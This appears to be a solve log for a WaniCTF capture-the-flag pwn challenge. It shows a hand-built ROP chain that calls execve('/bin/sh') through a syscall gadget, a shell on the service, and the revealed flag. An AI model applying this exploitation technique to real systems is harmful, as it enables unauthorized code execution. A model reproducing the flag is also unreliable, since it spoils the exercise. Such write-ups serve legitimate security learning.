```
# nc rop-normal.pwn.wanictf.org 9004

"/bin/sh" address is 0x404070

[menu]
1. append hex value
2. append "pop rdi; ret" addr
3. append "pop rsi; ret" addr
4. append "pop rdx; ret" addr
5. append "pop rax; ret" addr
6. append "syscall; ret" addr
8. show menu (this one)
9. show rop_arena
0. execute rop
> 5
"pop rax; ret" is appended
> 1
hex value?: 0x3b
0x000000000000003b is appended
> 2
"pop rdi; ret" is appended
> 1
hex value?: 0x404070
0x0000000000404070 is appended
> 3
"pop rsi; ret" is appended
> 1
hex value?: 0
0x0000000000000000 is appended
> 4
"pop rdx; ret" is appended
> 1
hex value?: 0
0x0000000000000000 is appended
> 6
"syscall; ret" is appended
> 0
     rop_arena
+--------------------+
| pop rax; ret       |<- rop start
+--------------------+
| 0x000000000000003b |
+--------------------+
| pop rdi; ret       |
+--------------------+
| 0x0000000000404070 |
+--------------------+
| pop rsi; ret       |
+--------------------+
| 0x0000000000000000 |
+--------------------+
| pop rdx; ret       |
+--------------------+
| 0x0000000000000000 |
+--------------------+
| syscall; ret       |
+--------------------+
ls
chall
flag.txt
redir.sh
cat flag.txt
FLAG{now-you-can-call-any-system-calls-with-syscall}
```
